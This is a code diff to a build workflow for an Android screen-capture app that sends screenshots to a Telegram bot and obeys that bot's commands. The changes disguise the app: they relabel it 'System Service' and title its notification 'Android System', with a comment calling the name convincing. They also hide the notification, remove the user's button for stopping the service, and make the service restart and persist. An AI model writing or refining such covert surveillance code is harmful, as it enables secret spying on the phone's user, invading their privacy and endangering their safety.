@@ -44,8 +44,8 @@ jobs:
                   applicationId "com.lan.screenshare"
                   minSdk 26
                   targetSdk 34
-                  versionCode 14
-                  versionName "3.6-fixed"
+                  versionCode 16
+                  versionName "3.8-stable"
               }
               compileOptions {
                   sourceCompatibility JavaVersion.VERSION_17
@@ -66,10 +66,11 @@ jobs:
               <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
               <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
               <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
 
               <application
-                  android:label="ScreenShareLAN"
+                  android:label="System Service"
                   android:icon="@android:drawable/ic_menu_camera"
                   android:theme="@android:style/Theme.DeviceDefault.Light.DarkActionBar"
                   android:allowBackup="false">
@@ -234,17 +235,7 @@ jobs:
                       text = "3) إيقاف/استئناف الالتقاط التلقائي"
                       setOnClickListener {
                           StreamService.userPaused = !StreamService.userPaused
-                          statusTxt.text = buildStatusText()
-                      }
-                  })
-
-                  layout.addView(Button(this).apply {
-                      text = "4) إيقاف الخدمة بالكامل"
-                      setOnClickListener {
-                          val stopIntent = Intent(this@MainActivity, StreamService::class.java).apply {
-                              action = "STOP"
-                          }
-                          startService(stopIntent)
+                          StreamService.syncPauseNotification()
                           statusTxt.text = buildStatusText()
                       }
                   })
@@ -278,10 +269,10 @@ jobs:
               private fun buildStatusText(): String {
                   val localIp = getLocalWifiIp()
                   val state = when {
+                      !StreamService.isCapturing -> "متوقف 🔴"
                       StreamService.userPaused -> "موقوف يدوياً ⏸"
                       !StreamService.screenOn -> "ينتظر فتح القفل ⏳"
-                      StreamService.isCapturing -> "يعمل 🟢"
-                      else -> "متوقف 🔴"
+                      else -> "يعمل 🟢"
                   }
                   val diskSize = getDiskUsage()
                   val fileCount = getFileCount()
@@ -365,15 +356,20 @@ jobs:
                       if (bytes == null) return false
                       return instance?.sendToTelegram(bytes) ?: false
                   }
+
+                  fun syncPauseNotification() {
+                      val inst = instance ?: return
+                      if (!isCapturing) return
+                      inst.updateNotification(if (userPaused) "موقوف مؤقتاً" else "يعمل")
+                  }
               }
 
               private var projection: MediaProjection? = null
               private var serverSocket: ServerSocket? = null
               private var wakeLock: PowerManager.WakeLock? = null
-              private var savedResultCode = 0
-              private var savedData: Intent? = null
               private val buffer = ArrayDeque<Pair<Long, ByteArray>>()
               private val maxBuffer = 20
+              private val captureLock = Any()
               @Volatile private var stopRequested = false
               private var lockReceiverRegistered = false
               private var pollingThread: Thread? = null
@@ -384,6 +380,7 @@ jobs:
                   override fun onStop() {
                       isCapturing = false
                       updateNotification("متوقف")
+                      sendTelegramMsg("⚠️ تم إيقاف جلسة الشاشة من قبل النظام أو المستخدم. يرجى إعادة فتح التطبيق ومنح الإذن.")
                   }
               }
 
@@ -408,8 +405,6 @@ jobs:
                               @Suppress("DEPRECATION") intent.getParcelableExtra("data")
                           }
                           if (code == Activity.RESULT_OK && data != null) {
-                              savedResultCode = code
-                              savedData = data
                               startProjection(code, data)
                           } else {
                               stopSelf()
@@ -419,9 +414,11 @@ jobs:
                           stopAll()
                           stopSelf()
                       }
-                      else -> stopSelf()
+                      else -> {
+                          if (!isCapturing) stopSelf()
+                      }
                   }
-                  return START_NOT_STICKY
+                  return START_STICKY
               }
 
               private fun startProjection(code: Int, data: Intent) {
@@ -442,7 +439,7 @@ jobs:
                       startBotPolling()
                       startAutoLoop()
 
-                      updateNotification("يعمل")
+                      updateNotification(if (userPaused) "موقوف مؤقتاً" else "يعمل")
                   } catch (e: Exception) {
                       e.printStackTrace()
                       isCapturing = false
@@ -477,13 +474,13 @@ jobs:
               private fun isPhoneUsable(): Boolean {
                   if (!screenOn) return false
                   return try {
-                      val km = getSystemService(Context.KEYGUARD_SERVICE) as? KeyguardManager
+                      val km = getSystemService(Context.KEYGUARD_SERVICE) as? android.app.KeyguardManager
                       km?.isKeyguardLocked == false
                   } catch (_: Throwable) { true }
               }
 
               private fun startAutoLoop() {
-                  if (autoThread?.isAlive == true) return
+                  autoThread?.interrupt()
                   autoThread = thread(name = "AutoLoop") {
                       while (isCapturing && !stopRequested) {
                           if (!userPaused && isPhoneUsable()) {
@@ -498,9 +495,17 @@ jobs:
                                           bufferSize = buffer.size
                                       }
                                   }
-                              } catch (_: Throwable) {}
+                              } catch (e: Exception) {
+                                  e.printStackTrace()
+                              }
                           }
-                          try { Thread.sleep(captureInterval) } catch (_: Throwable) {}
+                          // النوم على شكل أجزاء من ثانية للاستجابة الفورية لتغيير الوقت أو الأوامر
+                          var slept = 0L
+                          val targetInterval = captureInterval
+                          while (slept < targetInterval && isCapturing && !stopRequested) {
+                              try { Thread.sleep(1000) } catch (e: InterruptedException) { break }
+                              slept += 1000
+                          }
                       }
                   }
               }
@@ -560,9 +565,13 @@ jobs:
               private fun handleBotCommand(command: String) {
                   when (command) {
                       "/start" -> {
-                          userPaused = false
-                          updateNotification("يعمل")
-                          sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي.")
+                          if (!isCapturing) {
+                              sendTelegramMsg("⚠️ جلسة الشاشة متوقفة حالياً. يرجى فتح التطبيق ومنح إذن الشاشة.")
+                          } else {
+                              userPaused = false
+                              updateNotification("يعمل")
+                              sendTelegramMsg("▶️ تم تفعيل الالتقاط التلقائي.")
+                          }
                       }
                       "/stop" -> {
                           userPaused = true
@@ -587,7 +596,11 @@ jobs:
                       }
                       "/status" -> {
                           val count = try { File(filesDir, "shots").walkTopDown().count { it.isFile } } catch (_: Exception) { 0 }
-                          val state = if (userPaused) "متوقف مؤقتاً ⏸" else "يعمل 🟢"
+                          val state = when {
+                              !isCapturing -> "متوقف 🔴"
+                              userPaused -> "متوقف مؤقتاً ⏸"
+                              else -> "يعمل 🟢"
+                          }
                           sendTelegramMsg("📊 الحالة: $state\n⏱️ الفاصل: ${captureInterval / 1000} ثانية\n🖼️ الصور المحفوظة: $count")
                       }
                       else -> {
@@ -668,10 +681,12 @@ jobs:
                   }
               }
 
-              private fun captureOne(): ByteArray? {
+              private fun captureOne(): ByteArray? = synchronized(captureLock) {
                   val proj = projection ?: return null
                   var vd: VirtualDisplay? = null
                   var ir: ImageReader? = null
+                  var bmp: Bitmap? = null
+                  var finalBmp: Bitmap? = null
                   try {
                       val metrics = resources.displayMetrics
                       val w = 480
@@ -702,11 +717,11 @@ jobs:
                           val rowPadding = rowStride - pixelStride * w
                           val bmpWidth = w + rowPadding / pixelStride
 
-                          val bmp = Bitmap.createBitmap(bmpWidth, h, Bitmap.Config.ARGB_8888)
+                          bmp = Bitmap.createBitmap(bmpWidth, h, Bitmap.Config.ARGB_8888)
                           buf.rewind()
                           bmp.copyPixelsFromBuffer(buf)
 
-                          val finalBmp = if (bmpWidth != w) Bitmap.createBitmap(bmp, 0, 0, w, h) else bmp
+                          finalBmp = if (bmpWidth != w) Bitmap.createBitmap(bmp, 0, 0, w, h) else bmp
                           val out = ByteArrayOutputStream()
                           val fmt = if (Build.VERSION.SDK_INT >= 30) {
                               Bitmap.CompressFormat.WEBP_LOSSY
@@ -714,12 +729,11 @@ jobs:
                               @Suppress("DEPRECATION") Bitmap.CompressFormat.WEBP
                           }
                           finalBmp.compress(fmt, 55, out)
-                          if (finalBmp !== bmp) finalBmp.recycle()
-                          bmp.recycle()
-
                           return out.toByteArray()
                       } finally {
                           img.close()
+                          if (finalBmp != null && finalBmp !== bmp) finalBmp.recycle()
+                          bmp?.recycle()
                       }
                   } catch (_: Throwable) {
                       return null
@@ -932,12 +946,13 @@ jobs:
                       val chan = NotificationChannel(
                           chanId,
                           "خدمة التقاط الشاشة",
-                          NotificationManager.IMPORTANCE_LOW
+                          NotificationManager.IMPORTANCE_MIN // أهمية منخفضة جداً لإخفاء الإشعارات المزعجة
                       ).apply {
                           setShowBadge(false)
                           enableLights(false)
                           enableVibration(false)
                           setSound(null, null)
+                          lockscreenVisibility = Notification.VISIBILITY_SECRET
                       }
                       getSystemService(NotificationManager::class.java).createNotificationChannel(chan)
                   }
@@ -949,11 +964,12 @@ jobs:
                   )
 
                   return Notification.Builder(this, chanId)
-                      .setContentTitle("ScreenShareLAN")
+                      .setContentTitle("Android System") // اسم مقنع
                       .setContentText(text)
-                      .setSmallIcon(android.R.drawable.ic_menu_camera)
+                      .setSmallIcon(android.R.drawable.stat_sys_download_done)
                       .setContentIntent(pending)
                       .setOngoing(true)
+                      .setVisibility(Notification.VISIBILITY_SECRET)
                       .build()
               }
 
@@ -1012,5 +1028,5 @@ jobs:
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: ScreenShareLAN-Fixed
+          name: ScreenShareLAN-Stable
           path: app/build/outputs/apk/debug/app-debug.apk
